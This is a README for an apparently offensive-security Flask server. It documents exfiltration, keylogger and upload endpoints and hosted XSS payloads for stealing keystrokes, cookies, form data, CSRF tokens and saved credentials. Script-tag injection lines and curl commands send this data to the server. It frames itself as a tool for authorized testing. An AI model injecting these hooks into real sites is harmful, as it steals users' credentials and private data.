# PTT-WSRV - Penetration Testing Web Server

A Flask-based web server designed for authorized penetration testing and security assessments. This tool provides endpoints for testing data exfiltration vulnerabilities, XSS payload delivery, and file serving capabilities.

## Warning

This tool is intended for authorized security testing, CTF challenges, and educational purposes only. Only use this tool on systems you own or have explicit written permission to test. Unauthorized use may be illegal.

## Features

- **Multiple JavaScript Payload Generators**: Pre-built XSS payloads for various attack scenarios
- **Data Exfiltration Endpoints**: Capture and log exfiltrated data from test targets
- **Keylogger Receiver**: Accumulates and displays keystroke captures
- **File Serving**: Serve files from the current working directory
- **File Upload**: Receive uploaded files from compromised test targets
- **CORS Enabled**: All endpoints include CORS headers for cross-origin testing
- **Multi-Interface Support**: Automatically detects all network interfaces including VPN

## Installation

```bash
# Install dependencies
pip install flask

# Optional: For better network interface detection
pip install netifaces
```

## Usage

### Basic Usage

```bash
# Start server on default port 8080
python ptt-wsrv.py

# Start server on custom port
python ptt-wsrv.py -p 8000
```

### Multi-Interface Selection

When multiple network interfaces are detected, the tool will prompt you to select which IP address to use for payload generation:

```
Multiple network interfaces detected:
  1. 192.168.1.100
  2. 10.8.0.5

Select IP to use for payload's (1-2): 1
```

## Endpoints

### `/ping`
Health check endpoint that returns HTTP 200 with "ok" response.

**Usage:**
```bash
curl http://your-server:8080/ping
```

### `/data`
Receives exfiltrated data via GET or POST requests. Logs all query parameters and POST body content.

**Usage:**
```bash
# GET request with parameters
curl "http://your-server:8080/data?username=test&password=test123"

# POST request with JSON
curl -X POST http://your-server:8080/data \
  -H "Content-Type: application/json" \
  -d '{"cookies": "session=abc123", "url": "https://example.com"}'
```

### `/key`
Keylogger receiver that accumulates keystrokes and displays them in real-time.

**Usage:**
```bash
curl "http://your-server:8080/key?k=H"
curl "http://your-server:8080/key?k=e"
curl "http://your-server:8080/key?k=l"
curl "http://your-server:8080/key?k=l"
curl "http://your-server:8080/key?k=o"
```

Output on server console:
```
[2024-01-15 10:30:45] 192.168.1.50 - /key k=Hello
------------------------------------------------------------
```

### `/hooks`
Lists all available JavaScript payloads with descriptions and usage examples.

**Usage:**
```bash
curl http://your-server:8080/hooks
```

### `/hooks/<payload.js>`
Serves specific JavaScript payloads. Available payloads:

#### **klog.js** - Keylogger
Captures all keypresses and sends them to the `/key` endpoint.

```html
<script src="http://your-server:8080/hooks/klog.js"></script>
```

#### **info.js** - Information Exfiltration
Captures cookies, localStorage, sessionStorage, URL, and domain.

```html
<script src="http://your-server:8080/hooks/info.js"></script>
```

#### **formgrab.js** - Form Grabber
Intercepts form submissions and exfiltrates form data.

```html
<script src="http://your-server:8080/hooks/formgrab.js"></script>
```

#### **csrf.js** - CSRF Token Extractor
Finds and exfiltrates CSRF tokens from meta tags, hidden inputs, and cookies.

```html
<script src="http://your-server:8080/hooks/csrf.js"></script>
```

#### **savedcreds.js** - Saved Credentials Extractor
Attempts to capture browser-saved credentials using invisible form fields.

```html
<script src="http://your-server:8080/hooks/savedcreds.js"></script>
```

#### **sourcecode.js** - Source Code Exfiltration
Powerful payload for exfiltrating page source code with multiple modes:

**Mode 1: Exfiltrate current page to /data endpoint**
```html
<script src="http://your-server:8080/hooks/sourcecode.js?d=self"></script>
```

**Mode 2: Fetch external URL and send to /data endpoint**
```html
<script src="http://your-server:8080/hooks/sourcecode.js?d=https://target.com/api/config"></script>
```

**Mode 3: Exfiltrate current page to /upload (auto filename)**
```html
<script src="http://your-server:8080/hooks/sourcecode.js?u=self"></script>
```

**Mode 4: Exfiltrate current page to /upload (custom filename)**
```html
<script src="http://your-server:8080/hooks/sourcecode.js?u=self&n=mypage.html"></script>
```

**Mode 5: Fetch external URL and upload with custom filename**
```html
<script src="http://your-server:8080/hooks/sourcecode.js?u=https://target.com/data&n=data.json"></script>
```

**Mode 6: Crawl and exfiltrate current page + ALL linked pages** 🔥
```html
<script src="http://your-server:8080/hooks/sourcecode.js?u=all"></script>
```

Features:
- **d=self**: Exfiltrate current page to /data as JSON
- **d=url**: Fetch external URL and send to /data as JSON
- **u=self**: Upload current page (auto-generates filename from URL)
- **u=url**: Fetch external URL and upload (auto-generates filename)
- **u=all**: Recursively exfiltrate current page + all linked pages
- **n=filename**: Custom filename (works with u parameter)
- **2-second delay**: Waits for page rendering before exfiltration
- **Smart filenames**: Extracts from URL or generates unique names
- **Duplicate prevention**: Auto-appends counter for duplicate filenames

#### **combo.js** - Combined Payload
All-in-one payload that includes info exfiltration, keylogger, and form grabber.

```html
<script src="http://your-server:8080/hooks/combo.js"></script>
```

### `/upload/<filename>`
File upload endpoint that saves uploaded files to the current working directory.

**Usage:**
```bash
curl -X POST http://your-server:8080/upload/exfiltrated.txt \
  --data-binary @localfile.txt
```

### `/api/<command>`
API endpoint for controlling the web server.

**Available Commands:**

#### `/api/clear`
Clears the server console window (works on both Windows and Unix systems).

**Usage:**
```bash
curl http://your-server:8080/api/clear
```

### `/<path>`
Serves files from the current working directory.

**Usage:**
```bash
# Serve a specific file
curl http://your-server:8080/payload.html

# Download a file
wget http://your-server:8080/exploit.js
```

## Example Testing Scenarios

### Scenario 1: XSS Testing with Keylogger

1. Start the server:
   ```bash
   python ptt-wsrv.py -p 8080
   ```

2. Inject XSS payload on target application:
   ```html
   <script src="http://192.168.1.100:8080/hooks/klog.js"></script>
   ```

3. Monitor keystrokes on the server console as the victim types

### Scenario 2: Data Exfiltration Testing

1. Create a test HTML file with the info payload:
   ```html
   <!DOCTYPE html>
   <html>
   <body>
     <h1>Test Page</h1>
     <script src="http://192.168.1.100:8080/hooks/info.js"></script>
   </body>
   </html>
   ```

2. Serve the file and access it from a browser
3. Check server console for exfiltrated data

### Scenario 3: File Hosting for Payload Delivery

1. Place your payload file in the current directory
2. Start the server
3. Access the file via: `http://your-server:8080/yourpayload.js`

## Command-Line Options

```
usage: ptt-wsrv.py [-h] [-p PORT]

Helper web server for pentesting

optional arguments:
  -h, --help            show this help message and exit
  -p PORT, --port PORT  Port to listen on (default: 8080)
```

## Security Considerations

- This server binds to `0.0.0.0` and is accessible from all network interfaces
- No authentication or authorization is implemented
- All endpoints accept connections from any source
- CORS is enabled for all origins
- Designed for controlled testing environments only

## License

This tool is provided as-is for educational and authorized testing purposes.

## Disclaimer

The authors are not responsible for misuse of this tool. Always ensure you have proper authorization before conducting security testing.
